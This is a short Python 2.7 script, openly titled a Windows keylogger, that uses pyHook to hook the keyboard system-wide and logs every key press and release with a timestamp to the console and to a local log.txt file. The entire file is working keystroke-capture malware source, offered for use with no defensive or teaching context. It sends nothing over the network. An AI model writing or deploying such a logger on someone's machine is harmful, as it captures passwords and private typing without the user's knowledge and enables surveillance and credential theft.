# Super simple windows Keylogger for python2.7
import datetime
import time
import pythoncom
import pyHook

buffer = []
current = []

def try_write():
    global buffer
    if len(buffer) > 100:
        with open("log.txt", "a") as f:
            f.write('\n'.join(buffer) + '\n')
            f.close()
        buffer = []

def on_action(action, key):
    x = "%s %s %s" % (datetime.datetime.now(), action, key)
    print(x)
    buffer.append(x) 
    try_write()

def keydown(event):
    key = str(event.KeyID)
    if not key in current:
        current.append(key)
        on_action('DOWN', key)
 
def keyup(event):
    key = str(event.KeyID)
    if key in current:
        current.remove(key)
        on_action('UP', key)

obj = pyHook.HookManager()
obj.KeyDown = keydown
obj.KeyUp = keyup
obj.HookKeyboard()

pythoncom.PumpMessages()